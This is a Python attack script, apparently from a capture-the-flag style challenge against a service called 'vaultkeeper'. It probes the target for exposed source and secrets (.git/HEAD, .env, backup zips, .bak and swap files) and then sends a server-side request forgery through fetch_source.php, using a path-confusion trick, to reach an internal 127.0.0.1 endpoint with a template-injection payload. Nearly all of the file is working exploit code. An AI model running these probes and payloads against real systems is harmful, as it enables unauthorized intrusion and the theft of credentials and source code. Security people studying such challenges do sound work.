#!/usr/bin/env python3
"""
One batched pass: can the DEPLOYED source be read directly?

Everything else about vaultkeeper is closed, and every one of those was
closed by reverse-engineering a black box. If the deployed render_template.php
or vault_unseal.php source is readable, stage C is settled by inspection.

Targeted vocabulary only (16 names), never a wordlist sweep: Rule 01.
Discriminator learned earlier: an ACL'd script gives the Apache 403 HTML, a
missing script gives php-fpm 404 "No input file specified", a missing STATIC
file gives the Apache 404 HTML. Anything else is interesting.
"""
import sys, time, requests
B = sys.argv[1].rstrip("/")
S = requests.Session(); S.headers["User-Agent"] = "Mozilla/5.0"
PATHS = [
    "/.git/HEAD", "/.env", "/composer.json", "/vaultkeeper-source.zip",
    "/src.zip", "/source.zip", "/backup.zip", "/handout.zip",
    "/api/render_template.php.bak", "/api/render_template.php~",
    "/api/.render_template.php.swp", "/api/render_template.phps",
    "/api/vault_unseal.php.bak", "/api/vault_unseal.php~",
    "/api/", "/docs/", "/samples/", "/assets/",
]
for p in PATHS:
    try:
        r = S.get(B + p, timeout=20, allow_redirects=False)
        body = r.text.strip().replace("\n", " ")
        tag = "APACHE-404" if "Not Found" in body and "<address>" in body else \
              "FPM-404" if "No input file" in body else \
              "APACHE-403" if r.status_code == 403 else "??"
        print("%-34s %3d %-11s %4d %s" % (p, r.status_code, tag, len(r.text), body[:110]))
    except Exception as e:
        print("%-34s ERR %s" % (p, e))
    time.sleep(0.15)
# does the deployed render_template accept GET? (handout is POST only)
u = "%s/api/fetch_source.php%%3Fa.php?url=%s" % (B, requests.utils.quote(
    "http://127.0.0.1/api/render_template.php?template=[[config.cap_mask]]&event=maintenance.x", safe=""))
try:
    r = S.get(u, timeout=30)
    print("\n[GET render_template via SSRF] %d %s" % (r.status_code, r.text[:400].replace("\n", " ")))
except Exception as e:
    print("[GET render_template] ERR", e)
